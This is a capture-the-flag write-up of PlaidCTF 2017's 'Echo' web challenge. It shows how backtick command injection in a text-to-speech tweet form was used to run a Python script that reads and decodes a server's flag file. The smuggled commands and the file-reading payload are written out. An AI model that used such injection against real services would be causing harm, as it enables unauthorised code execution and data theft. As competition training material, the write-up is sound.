---
layout: page
title: "PlaidCTF 2017 Writeup: Echo"
---

> Echo
> 
> Web (200 pts)
>
> If you hear enough, you may hear the whispers of a key... 
>
> If you see [app.py]({{ site.baseurl }}/ctfs/pctf2017/echo/echo.py) well enough, you will notice the UI sucks... 
>
> http://echo.chal.pwning.xxx:9977/ 
>
> http://echo2.chal.pwning.xxx:9977/

Loved this challenge... Once I knew I could execute code on the system it became pure fun. :smile:
 
We are given a UI where one can enter 4 "tweets" (140 character messages), and have them processed and read back to us via the voice synthesizer. The code seems fairly tight, no path traversal or other tricks are possible... However, when trying a variety of characters in the tweets I found that the dollar sign and the backtick cause a system error.

Yay, command injection! :smile: To confirm we can send ``` `ls` ``` as a tweet and have the folder contents read to us.

It looks like the code vulnerable to injection lives in ```run.py``` executed by Docker. It does have access to the obfuscated flag file in the ```/share``` folder. So what we can do is submit (minimalistic) code to decipher the flag and have it read back to us.

Here's a script that will do it. It is a reverse of the encoding algorithm from the script supplied to us. For clarity the characters in the flag are written out as decimal numbers (I found that everything else was read in a garbled way, with letters swallowed or unclear):

```python
f=''
i=1
c=0
r=open('/share/flag','rb').read()
for x in r:
	c^=ord(x)
	if i%65000==0:
		f+=str(c)+' '
		c=0
	i+=1
print f
```

Once we submit the script...:

![tweets.png]({{ site.baseurl }}/ctfs/pctf2017/echo/tweets.png)

... we get back the vocalized list of values:

![result.png]({{ site.baseurl }}/ctfs/pctf2017/echo/result.png)

The [delivered audio file]({{ site.baseurl }}/ctfs/pctf2017/echo/3.wav) sounds fairly clear and gives us the following sequence of numbers:

```80 67 84 70 123 76 49 53 115 116 51 110 95 84 48 95 95 114 101 101 101 95 114 101 101 101 101 101 101 95 114 101 101 101 95 108 97 125```

Once converted to characters, they produce a flag: ```PCTF{L15st3n_T0__reee_reeeeee_reee_la}```.